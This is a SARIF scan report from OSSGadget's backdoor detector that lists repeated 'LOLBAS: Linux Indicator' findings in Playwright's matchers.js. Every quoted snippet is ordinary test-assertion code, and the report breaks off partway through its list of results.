{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 414,
                  "startColumn": 7,
                  "endLine": 414,
                  "endColumn": 16,
                  "snippet": {
                    "text": "ull || text === void 0 ? void 0 : text.substring(0, 1000)) || '')}`);\n  const pass = response.ok();\n  return {\n    message,\n    pass\n  };\n}\nasync function toPass(callback, options = {}) {\n  var _testInfo$_projectInt, _testInfo$_projectInt2;\n  const testInfo = (0, _globals.currentTestInfo)();\n  const timeout = (0, _config.takeFirst)(options.timeout, testInfo === null || testInfo === void 0 || (_testInfo$_projectInt = testInfo._projectInternal.expect) === null || _testInfo$_projectInt === void 0 || (_testInfo$_projectInt = _testInfo$_projectInt.toPass) === null || _testInfo$_projectInt === void 0 ? void ",
                    "rendered": {
                      "text": "ull || text === void 0 ? void 0 : text.substring(0, 1000)) || '')}`);\n  const pass = response.ok();\n  return {\n    message,\n    pass\n  };\n}\nasync function toPass(callback, options = {}) {\n  var _testInfo$_projectInt, _testInfo$_projectInt2;\n  const testInfo = (0, _globals.currentTestInfo)();\n  const timeout = (0, _config.takeFirst)(options.timeout, testInfo === null || testInfo === void 0 || (_testInfo$_projectInt = testInfo._projectInternal.expect) === null || _testInfo$_projectInt === void 0 || (_testInfo$_projectInt = _testInfo$_projectInt.toPass) === null || _testInfo$_projectInt === void 0 ? void ",
                      "markdown": "`ull || text === void 0 ? void 0 : text.substring(0, 1000)) || '')}`);\n  const pass = response.ok();\n  return {\n    message,\n    pass\n  };\n}\nasync function toPass(callback, options = {}) {\n  var _testInfo$_projectInt, _testInfo$_projectInt2;\n  const testInfo = (0, _globals.currentTestInfo)();\n  const timeout = (0, _config.takeFirst)(options.timeout, testInfo === null || testInfo === void 0 || (_testInfo$_projectInt = testInfo._projectInternal.expect) === null || _testInfo$_projectInt === void 0 || (_testInfo$_projectInt = _testInfo$_projectInt.toPass) === null || _testInfo$_projectInt === void 0 ? void `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 392,
                  "startColumn": 5,
                  "endLine": 393,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.url', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nasync function toBeOK(response) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.url', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nasync function toBeOK(response) {\n",
                      "markdown": "`    return await locator._expect('to.have.url', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nasync function toBeOK(response) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 5,
                  "endLine": 378,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.title', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveURL(page, expected, options) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.title', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveURL(page, expected, options) {\n",
                      "markdown": "`    return await locator._expect('to.have.title', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveURL(page, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 364,
                  "startColumn": 5,
                  "endLine": 365,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.values', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveTitle(page, expected, options = {}) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.values', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveTitle(page, expected, options = {}) {\n",
                      "markdown": "`    return await locator._expect('to.have.values', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveTitle(page, expected, options = {}) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 354,
                  "startColumn": 5,
                  "endLine": 355,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.value', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveValues(locator, expected, options) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.value', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveValues(locator, expected, options) {\n",
                      "markdown": "`    return await locator._expect('to.have.value', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveValues(locator, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 343,
                  "startColumn": 7,
                  "endLine": 344,
                  "snippet": {
                    "text": "        expectedText,\n        isNot,\n        useInnerText: options === null || options === void 0 ? void 0 : options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n",
                    "rendered": {
                      "text": "        expectedText,\n        isNot,\n        useInnerText: options === null || options === void 0 ? void 0 : options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n",
                      "markdown": "`        expectedText,\n        isNot,\n        useInnerText: options === null || options === void 0 ? void 0 : options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 7,
                  "endLine": 331,
                  "snippet": {
                    "text": "        expectedText,\n        isNot,\n        useInnerText: options === null || options === void 0 ? void 0 : options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  } else {\n    return _toMatchText.toMatchText.call(this, 'toHaveText', locator, 'Locator', async (isNot, timeout) => {\n",
                    "rendered": {
                      "text": "        expectedText,\n        isNot,\n        useInnerText: options === null || options === void 0 ? void 0 : options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  } else {\n    return _toMatchText.toMatchText.call(this, 'toHaveText', locator, 'Locator', async (isNot, timeout) => {\n",
                      "markdown": "`        expectedText,\n        isNot,\n        useInnerText: options === null || options === void 0 ? void 0 : options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  } else {\n    return _toMatchText.toMatchText.call(this, 'toHaveText', locator, 'Locator', async (isNot, timeout) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 315,
                  "startColumn": 5,
                  "endLine": 316,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.role', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveText(locator, expected, options = {}) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.role', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveText(locator, expected, options = {}) {\n",
                      "markdown": "`    return await locator._expect('to.have.role', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveText(locator, expected, options = {}) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 5,
                  "endLine": 305,
                  "snippet": {
                    "text": "      expressionArg: name,\n      expectedValue: expected,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveRole(locator, expected, options) {\n",
                    "rendered": {
                      "text": "      expressionArg: name,\n      expectedValue: expected,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveRole(locator, expected, options) {\n",
                      "markdown": "`      expressionArg: name,\n      expectedValue: expected,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveRole(locator, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 5,
                  "endLine": 295,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.id', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveJSProperty(locator, name, expected, options) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.id', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveJSProperty(locator, name, expected, options) {\n",
                      "markdown": "`    return await locator._expect('to.have.id', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveJSProperty(locator, name, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 284,
                  "startColumn": 5,
                  "endLine": 285,
                  "snippet": {
                    "text": "      expressionArg: name,\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveId(locator, expected, options) {\n",
                    "rendered": {
                      "text": "      expressionArg: name,\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveId(locator, expected, options) {\n",
                      "markdown": "`      expressionArg: name,\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveId(locator, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 273,
                  "startColumn": 5,
                  "endLine": 274,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.count', {\n      expectedNumber: expected,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveCSS(locator, name, expected, options) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.count', {\n      expectedNumber: expected,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveCSS(locator, name, expected, options) {\n",
                      "markdown": "`    return await locator._expect('to.have.count', {\n      expectedNumber: expected,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveCSS(locator, name, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 263,
                  "startColumn": 7,
                  "endLine": 264,
                  "snippet": {
                    "text": "      return await locator._expect('to.have.class', {\n        expectedText,\n        isNot,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n",
                    "rendered": {
                      "text": "      return await locator._expect('to.have.class', {\n        expectedText,\n        isNot,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n",
                      "markdown": "`      return await locator._expect('to.have.class', {\n        expectedText,\n        isNot,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 254,
                  "startColumn": 7,
                  "endLine": 255,
                  "snippet": {
                    "text": "      return await locator._expect('to.have.class.array', {\n        expectedText,\n        isNot,\n        timeout\n      });\n    }, expected, options);\n  } else {\n    return _toMatchText.toMatchText.call(this, 'toHaveClass', locator, 'Locator', async (isNot, timeout) => {\n",
                    "rendered": {
                      "text": "      return await locator._expect('to.have.class.array', {\n        expectedText,\n        isNot,\n        timeout\n      });\n    }, expected, options);\n  } else {\n    return _toMatchText.toMatchText.call(this, 'toHaveClass', locator, 'Locator', async (isNot, timeout) => {\n",
                      "markdown": "`      return await locator._expect('to.have.class.array', {\n        expectedText,\n        isNot,\n        timeout\n      });\n    }, expected, options);\n  } else {\n    return _toMatchText.toMatchText.call(this, 'toHaveClass', locator, 'Locator', async (isNot, timeout) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 243,
                  "startColumn": 5,
                  "endLine": 244,
                  "snippet": {
                    "text": "      expressionArg: name,\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveClass(locator, expected, options) {\n",
                    "rendered": {
                      "text": "      expressionArg: name,\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveClass(locator, expected, options) {\n",
                      "markdown": "`      expressionArg: name,\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveClass(locator, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 230,
                  "startColumn": 7,
                  "endLine": 231,
                  "snippet": {
                    "text": "      return await locator._expect('to.have.attribute', {\n        expressionArg: name,\n        isNot,\n        timeout\n      });\n    }, options);\n  }\n  return _toMatchText.toMatchText.call(this, 'toHaveAttribute', locator, 'Locator', async (isNot, timeout) => {\n",
                    "rendered": {
                      "text": "      return await locator._expect('to.have.attribute', {\n        expressionArg: name,\n        isNot,\n        timeout\n      });\n    }, options);\n  }\n  return _toMatchText.toMatchText.call(this, 'toHaveAttribute', locator, 'Locator', async (isNot, timeout) => {\n",
                      "markdown": "`      return await locator._expect('to.have.attribute', {\n        expressionArg: name,\n        isNot,\n        timeout\n      });\n    }, options);\n  }\n  return _toMatchText.toMatchText.call(this, 'toHaveAttribute', locator, 'Locator', async (isNot, timeout) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 213,
                  "startColumn": 5,
                  "endLine": 214,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.accessible.name', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveAttribute(locator, name, expected, options) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.accessible.name', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveAttribute(locator, name, expected, options) {\n",
                      "markdown": "`    return await locator._expect('to.have.accessible.name', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveAttribute(locator, name, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 201,
                  "startColumn": 5,
                  "endLine": 202,
                  "snippet": {
                    "text": "    return await locator._expect('to.have.accessible.description', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveAccessibleName(locator, expected, options) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.have.accessible.description', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveAccessibleName(locator, expected, options) {\n",
                      "markdown": "`    return await locator._expect('to.have.accessible.description', {\n      expectedText,\n      isNot,\n      timeout\n    });\n  }, expected, options);\n}\nfunction toHaveAccessibleName(locator, expected, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 188,
                  "startColumn": 7,
                  "endLine": 189,
                  "snippet": {
                    "text": "        expectedText,\n        isNot,\n        useInnerText: options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n",
                    "rendered": {
                      "text": "        expectedText,\n        isNot,\n        useInnerText: options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n",
                      "markdown": "`        expectedText,\n        isNot,\n        useInnerText: options.useInnerText,\n        timeout\n      });\n    }, expected, options);\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 7,
                  "endLine": 172,
                  "snippet": {
                    "text": "        expectedText,\n        isNot,\n        useInnerText: options.useInnerText,\n        timeout\n      });\n    }, expected, {\n      ...options,\n      contains: true\n",
                    "rendered": {
                      "text": "        expectedText,\n        isNot,\n        useInnerText: options.useInnerText,\n        timeout\n      });\n    }, expected, {\n      ...options,\n      contains: true\n",
                      "markdown": "`        expectedText,\n        isNot,\n        useInnerText: options.useInnerText,\n        timeout\n      });\n    }, expected, {\n      ...options,\n      contains: true\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 5,
                  "endLine": 156,
                  "snippet": {
                    "text": "    return await locator._expect('to.be.in.viewport', {\n      isNot,\n      expectedNumber: options === null || options === void 0 ? void 0 : options.ratio,\n      timeout\n    });\n  }, options);\n}\nfunction toContainText(locator, expected, options = {}) {\n",
                    "rendered": {
                      "text": "    return await locator._expect('to.be.in.viewport', {\n      isNot,\n      expectedNumber: options === null || options === void 0 ? void 0 : options.ratio,\n      timeout\n    });\n  }, options);\n}\nfunction toContainText(locator, expected, options = {}) {\n",
                      "markdown": "`    return await locator._expect('to.be.in.viewport', {\n      isNot,\n      expectedNumber: options === null || options === void 0 ? void 0 : options.ratio,\n      timeout\n    });\n  }, options);\n}\nfunction toContainText(locator, expected, options = {}) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 146,
                  "startColumn": 5,
                  "endLine": 147,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeVisible', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(visible ? 'to.be.visible' : 'to.be.hidden', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeInViewport(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeVisible', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(visible ? 'to.be.visible' : 'to.be.hidden', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeInViewport(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeVisible', locator, 'Locator', expected, unexpected, arg, async (isNot, timeout) => {\n    return await locator._expect(visible ? 'to.be.visible' : 'to.be.hidden', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeInViewport(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 5,
                  "endLine": 135,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeHidden', locator, 'Locator', 'hidden', 'visible', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.hidden', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeVisible(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeHidden', locator, 'Locator', 'hidden', 'visible', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.hidden', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeVisible(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeHidden', locator, 'Locator', 'hidden', 'visible', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.hidden', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeVisible(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/matchers/matchers.js"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 5,
                  "endLine": 127,
                  "snippet": {
                    "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeFocused', locator, 'Locator', 'focused', 'inactive', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.focused', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeHidden(locator, options) {\n",
                    "rendered": {
                      "text": "  return _toBeTruthy.toBeTruthy.call(this, 'toBeFocused', locator, 'Locator', 'focused', 'inactive', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.focused', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeHidden(locator, options) {\n",
                      "markdown": "`  return _toBeTruthy.toBeTruthy.call(this, 'toBeFocused', locator, 'Locator', 'focused', 'inactive', '', async (isNot, timeout) => {\n    return await locator._expect('to.be.focused', {\n      isNot,\n      timeout\n    });\n  }, options);\n}\nfunction toBeHidden(locator, options) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
